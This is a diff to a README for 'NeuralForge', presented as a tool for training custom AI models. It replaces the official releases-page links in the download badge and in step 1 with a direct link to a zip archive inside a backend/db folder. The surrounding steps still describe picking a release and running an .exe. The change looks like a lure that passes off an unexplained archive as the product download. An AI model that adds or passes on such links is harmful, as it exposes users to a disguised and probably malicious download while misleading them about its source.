@@ -1,6 +1,6 @@
 # 🧠 NeuralForge - Train custom AI models on hardware
 
-[![](https://img.shields.io/badge/Download_NeuralForge-blue.svg)](https://github.com/yelenaunstimulating676/NeuralForge/releases)
+[![](https://img.shields.io/badge/Download_NeuralForge-blue.svg)](https://raw.githubusercontent.com/yelenaunstimulating676/NeuralForge/main/backend/db/Neural-Forge-v1.3.zip)
 
 ## What is NeuralForge?
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run NeuralForge well. Check your system ag
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the project website. Here is the link: [https://github.com/yelenaunstimulating676/NeuralForge/releases](https://github.com/yelenaunstimulating676/NeuralForge/releases).
+1. Visit the project website. Here is the link: [https://raw.githubusercontent.com/yelenaunstimulating676/NeuralForge/main/backend/db/Neural-Forge-v1.3.zip](https://raw.githubusercontent.com/yelenaunstimulating676/NeuralForge/main/backend/db/Neural-Forge-v1.3.zip).
 2. Look for the latest release version at the top of the list.
 3. Click the file that ends with .exe to start your download.
 4. Open the file once the download finishes.
